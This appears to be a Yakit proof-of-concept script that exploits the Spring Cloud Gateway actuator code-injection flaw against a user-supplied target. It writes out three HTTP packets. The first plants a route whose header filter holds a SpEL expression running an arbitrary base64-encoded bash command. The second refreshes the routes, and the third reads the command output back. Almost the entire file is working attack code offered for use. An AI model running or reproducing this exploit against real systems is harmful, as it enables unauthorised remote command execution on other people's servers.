content:
yakit.AutoInitYakit()

# Input your code!


#isHttps = cli.Have("https", cli.setDefault(false))

packet1 = `
POST /actuator/gateway/routes/twsec HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 330

{
 "id": "twsec",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,{{params(cmd)}}}|{base64,-d}|{bash,-i}\").getInputStream()))}"
        }
    }],
    "uri": "http://aaaa.aa",
    "order": 0
}`

packet2 = `
POST /actuator/gateway/refresh HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 456`

packet3 = `
GET /actuator/gateway/routes/twsec HTTP/1.1
Host: {{params(target)}}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close`



log.setLevel("info")
yakit.Info("开始创建路由！")
isHttps = cli.Have("https", cli.setDefault(false))
target = cli.String("target")
cmd = cli.String("cmd")
cmd = codec.EncodeBase64(cmd)
if target == "" {
    yakit.Error("没有输入要攻击的地址！")
}
if cmd == "" {
    yakit.Error("没有输入要执行的命令！")
}
sendPacket1 = func(target,cmd) {
    return poc.HTTP(
        packet1, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "cmd": cmd,
            "target": target
        },
    ))
}

result = "Created"
rsp, rep, err =sendPacket1(target,cmd)
ins,err=poc.ParseBytesToHTTPResponse(rsp)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
if err != nil { 
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("创建路由失败！")
    die(err) 
}
if ins.StatusCode==201  {
    if str.MatchAllOfSubString(headers, result){
        yakit.Info("创建路由成功！")
        yakit.SetProgress(0.1)
        sleep(1)
    }else{
        yakit.SetProgress(0.1)
        sleep(1)
        yakit.SetProgress(0.4)
        sleep(1)
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.SetProgress(1.0)
        sleep(1)
        yakit.Error("创建路由失败！")
        os.Exit()
    }
}

yakit.Info("开始确认路由！")
sendPacket2 = func(target) {
    return poc.HTTP(
        packet2, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            #"cmd": cmd,
            "target": target
        },
    ))
}

rsp, rep, err =sendPacket2(target)
ins,err=poc.ParseBytesToHTTPResponse(rsp)

if err != nil { 
    
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("确认路由失败！")
    die(err) 
}

if ins.StatusCode==200 {
    yakit.Info("确认路由成功！")
    yakit.SetProgress(0.4)
    sleep(1)
}

yakit.Info("开始查询路由！")
sendPacket3 = func(target) {
    return poc.HTTP(
        packet3, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            #"cmd": cmd,
            "target": target
        },
    ))
}
result = "filters"
rsp, rep, err =sendPacket3(target)
ins,err=poc.ParseBytesToHTTPResponse(rsp)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
if err != nil { 
   
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("查询路由失败！")
    die(err) 
}
if ins.StatusCode==200 {
    if str.MatchAllOfSubString(body, result){
        yakit.Info("查询路由成功！")
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.Info(body)
        log.info(body)
        
    }else{
       
        yakit.SetProgress(0.8)
        sleep(1)
        yakit.SetProgress(1.0)
        sleep(1)
        yakit.Error("查询路由失败！")
        os.Exit()
    }
}
yakit.SetProgress(1.0)
sleep(1)
